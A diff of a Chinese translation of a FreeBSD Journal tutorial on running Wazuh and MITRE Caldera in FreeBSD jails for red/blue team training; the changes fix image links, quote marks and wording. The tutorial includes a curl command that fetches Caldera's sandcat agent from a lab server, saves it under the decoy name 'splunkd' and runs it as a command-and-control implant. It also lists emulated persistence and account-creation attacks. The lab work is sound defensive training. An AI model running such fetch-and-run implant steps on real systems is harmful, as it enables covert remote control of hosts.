@@ -1,6 +1,6 @@
 # Wazuh 和 MITRE Caldera 在 FreeBSD Jail 中的使用
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/bae8f84a-e2c2-4762-9e32-537ee2b0616b)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-1.png)
 
 - 原文链接：<https://freebsdfoundation.org/wp-content/uploads/2023/11/Cardenas.pdf>
 - 作者：ALONSO CÁRDENAS
@@ -10,7 +10,7 @@
 
 此外，组织中支持安全管理的团队需要持续的技术培训，因此传统培训方法需要补充一些工具，这些工具能模拟攻击（红队）并帮助培训事件响应团队（蓝队）。
 
-FreeBSD 为我们提供了支持信息安全控制实施的各种活动的应用程序和工具。Jail 是 FreeBSD 的强大特性，能让你创建隔离的环境，非常适合与信息安全或网络安全相关的任务，帮助保持干净的主机环境，使用脚本或工具（如 AppJail）自动化部署任务，模拟安全环境以分析，并使用测试工具最快地部署安全解决方案。
+FreeBSD 为我们提供了支持信息安全控制实施的各种活动的应用程序和工具。Jail 是 FreeBSD 的强大特性，能让你创建隔离的环境，非常适合与信息安全或网络安全相关的任务，帮助保持干净的主机环境，使用脚本或工具（如 AppJail）自动化部署任务，模拟安全环境以分析，以及测试工具，能最快地部署安全解决方案。
 
 在这篇文章中，我们将专注于部署两个开源工具，当结合使用时，可以补充由红队和蓝队执行的培训练习。它基于《使用 CALDERA 和 [Wazuh](https://wazuh.com/blog/adversary-emulation-with-caldera-and-wazuh/) 进行对抗仿真》这篇文章，但使用了 FreeBSD、AppJail（Jail 管理）、Wazuh 和 MITRE Caldera。
 
@@ -20,7 +20,7 @@ FreeBSD 为我们提供了支持信息安全控制实施的各种活动的应用
 
 [Wazuh](https://wazuh.com/) 是用于威胁预防、检测和响应的免费开源平台。它能够在本地、虚拟化、容器化和基于云的环境中保护工作负载。Wazuh 解决方案包括部署到受监视系统的端点安全代理，以及收集和分析代理所采集数据的管理服务器。Wazuh 的特点包括与 [Elastic Stack](https://www.elastic.co/elastic-stack/) 和 [OpenSearch](https://opensearch.org/) 的完全集成，提供搜索引擎和数据可视化工具，用户可通过这些工具浏览安全警报。
 
-Wazuh 在 FreeBSD 上的移植由 [Michael Muenz](mailto:m.muenz@gmail.com) 发起。他在 2021 年 9 月首次将 Wazuh 添加到 ports 中，命名为 [security/wazuh-agent](https://cgit.freebsd.org/ports/tree/security/wazuh-agent/)。在 2022 年 7 月，我接手了该 port 的维护，并开始移植其他 Wazuh 组件。
+Wazuh 在 FreeBSD 上的移植由 [Michael Muenz](mailto:m.muenz@gmail.com) 发起。他在 2021 年 9 月首次将 Wazuh 添加到 ports 中，即 [security/wazuh-agent](https://cgit.freebsd.org/ports/tree/security/wazuh-agent/)。在 2022 年 7 月，我接手了该 port 的维护，并开始移植其他 Wazuh 组件。
 
 目前，所有 Wazuh 组件全部移植或适配完成：[security/wazuh-manager](https://cgit.freebsd.org/ports/tree/security/wazuh-manager/)、[security/wazuh-agent](https://cgit.freebsd.org/ports/tree/security/wazuh-agent/)、[security/wazuh-server](https://cgit.freebsd.org/ports/tree/security/wazuh-server/)、[security/wazuh-indexer](https://cgit.freebsd.org/ports/tree/security/wazuh-indexer/) 和 [security/wazuh-dashboard](https://cgit.freebsd.org/ports/tree/security/wazuh-dashboard/)。
 
@@ -34,7 +34,7 @@ MITRE Caldera（[security/caldera](https://cgit.freebsd.org/ports/tree/security/
 
 ## AppJail
 
-[AppJail](https://github.com/DtxdF/AppJail) 是完全由 sh(1) 和 C 编写的框架，用于使用 FreeBSD Jail 创建隔离的、便携的、易于部署的环境，这些环境行为类似于应用程序。AppJail 的有趣特性之一是 [AppJail-Makejails](https://github.com/AppJail-makejails) 格式。它是文本文档，包含构建 jail 的所有指令。Makejail 是构建 jail、配置它、安装应用程序、配置它们等过程的又一层抽象。
+[AppJail](https://github.com/DtxdF/AppJail) 是完全由 sh(1) 和 C 编写的框架，用于使用 FreeBSD Jail 创建隔离的、便携的、易于部署的环境，这些环境的行为类似应用程序。AppJail 的有趣特性之一是 [AppJail-Makejails](https://github.com/AppJail-makejails) 格式。它是文本文档，包含构建 jail 的所有指令。Makejail 是构建 jail、配置它、安装应用程序、配置它们等过程的又一层抽象。
 
 ## 准备
 
@@ -43,10 +43,10 @@ MITRE Caldera（[security/caldera](https://cgit.freebsd.org/ports/tree/security/
 将锚点放入 pf.conf 中：
 
 ```sh
-# cat << “EOF” >> /etc/pf.conf
-nat-anchor ‘appjail-nat/jail/*’
-nat-anchor “appjail-nat/network/*”
-rdr-anchor “appjail-rdr/*”
+# cat << "EOF" >> /etc/pf.conf
+nat-anchor 'appjail-nat/jail/*'
+nat-anchor "appjail-nat/network/*"
+rdr-anchor "appjail-rdr/*"
 EOF
 ```
 
@@ -68,7 +68,7 @@ sysctl net.inet.ip.forwarding=1
 # appjail fetch
 ```
 
-如需指定特定版本，必须使用以下方法：
+如需指定特定版本，必须使用以下命令：
 
 ```sh
 # appjail fetch www -v 13.2-RELEASE -a amd64
@@ -96,7 +96,7 @@ Wazuh makejail 将创建并配置 jail，其中包含 Wazuh SIEM 使用的所有
 # appjail makejail -f gh+alonsobsd/wazuh-makejail -o osversion 13.2-RELEASE -j wazuh -- --network wazuh-net --server_ip 11.1.0.2
 ```
 
-完成后，我们将看到为 wazuh-dashboard 生成的凭据，以及在以下示例中用于将代理添加到 wazuh-manager 的密码：
+完成后，我们将看到为 wazuh-dashboard 生成的凭据，以及以下示例中用于将代理添加到 wazuh-manager 的密码：
 
 ```sh
 ################################################
@@ -112,7 +112,7 @@ Password  :  @ugEwZHpUJ8a7oCsc1rxJKd3/hlk=
 
 检查 wazuh-dashboard 服务是否就绪。尝试使用 Web 浏览器连接到 `https://11.1.0.2:5601/app/wazuh`。
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/4b1770db-6891-4fbe-8c1d-fac3dc4cfc77)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-2.png)
 
 ### 部署 Wazuh 代理
 
@@ -139,7 +139,7 @@ Password  :  @ugEwZHpUJ8a7oCsc1rxJKd3/hlk=
 
 对于每个代理（agent01、agent02、agent03、agent04 和 agent05），重复此命令，使用不同的 IP 地址（11.1.0.3、11.1.0.4、11.1.0.5 和 11.1.0.6），并更改系统版本（13.2-RELEASE 或 14.0-RC1）。完成后，我们将能够在 wazuh-dashboard 的 "Agents" 窗口中查看已连接代理的列表。
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/d1e97b28-d360-4cf1-b23a-b1dee48d1365)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-3.png)
 
 最后，在每个代理上安装 `net/curl`。此工具将用于下载与 MITRE Caldera 交互的载荷。
 
@@ -193,15 +193,15 @@ Password  :  1TPza2NLp0h1scaZ2uA=
 
 测试 MITRE Caldera 服务是否就绪。尝试使用 Web 浏览器连接到 `https://11.1.0.2:8443/`。
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/1b7f5324-4c36-460d-8d7b-626783d54b01)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-4.png)
 
-如果 MITRE Caldera 服务在线，我们继续在每个代理上下载并运行 sandcat 载荷。通过这样做，MITRE Caldera 将能够在每个 jail 中运行测试。
+如果 MITRE Caldera 服务在线，我们继续在每个代理上下载并运行 sandcat 载荷。这样，MITRE Caldera 将能够在每个 jail 中运行测试。
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/89a8df9a-ea9f-4297-9fc9-2ee0aab53a70)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-5.png)
 
 ```sh
-# appjail cmd jexec agent01 sh -c ‘curl -k -s -X POST -H “file:sandcat.go” -H
-“platform:freebsd” https://11.1.0.10:8443/file/download > /root/splunkd’
+# appjail cmd jexec agent01 sh -c 'curl -k -s -X POST -H "file:sandcat.go" -H
+"platform:freebsd" https://11.1.0.10:8443/file/download > /root/splunkd'
 # appjail cmd jexec agent01 chmod 750 /root/splunkd
 # appjail cmd jexec agent01 ./splunkd -server https://11.1.0.10:8443 -group red -v
 
@@ -223,32 +223,32 @@ available data encoders=base64, plain-text
 
 在不同的终端会话中，为每个代理重复前面的命令，只更改 jail 的名称（agent01、agent02、agent03、agent04 和 agent05）。完成这些任务后，我们将在 MITRE Caldera Agents 窗口中看到可用代理的列表。
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/b79764a5-9fdd-4958-b280-bd8ebf284c46)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-6.png)
 
 添加（潜在的链接按钮）并在不同的代理上运行一些模拟测试。以下四个测试将在 wazuh-manager 中生成警报：
 
 1) Cron – 用引用的文件替换 crontab（T1053.003）
 2) 在 FreeBSD 中使用 `root` GID 创建新用户（T1136.001）
-3) 在 FreeBSD 系统上创建用户帐户（T1136.001）
-4) 创建本地帐户（FreeBSD）（T1078.003）
+3) 在 FreeBSD 系统上创建用户账户（T1136.001）
+4) 创建本地账户（FreeBSD）（T1078.003）
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/924b5db2-9145-4dff-8f28-e240ae93e37d)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-7.png)
 
 完成模拟操作后，我们在 wazuh-dashboard 控制台中验证每个测试生成的警报。
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/ca6fb0fd-64c4-4730-a532-2d54c5753dad)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-8.png)
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/620548ed-980e-49d6-acd9-a73bd9a6f1e5)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-9.png)
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/77e60ce8-b4f7-4477-a401-1190cc47a2a7)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-10.png)
 
-![image](https://github.com/Canvis-Me/freebsd-journal-cn/assets/55122738/7d0c2a6d-e0d2-4c9e-9a93-d78a7199bf8c)
+![image](../png/2023-0910/wazuh-and-mitre-caldera-11.png)
 
 ## 结论
 
 Wazuh 和 MITRE Caldera 提供了可定制的工具，以适应安全信息或网络安全需求。本文仅介绍了 Wazuh SIEM 和 MITRE Caldera 全部功能中的一小部分。如果你想进一步了解这些工具，Wazuh 项目和 MITRE Caldera 项目维护着出色的文档（<https://documentation.wazuh.com/current/index.html>）和（<https://caldera.readthedocs.io/en/latest/>），并提供强大的社区支持。
 
-AppJail 帮助快速将本文使用的工具部署到 jail 容器中。
+最后，AppJail 帮助快速将本文使用的工具部署到 jail 容器中。
 
 ---
 
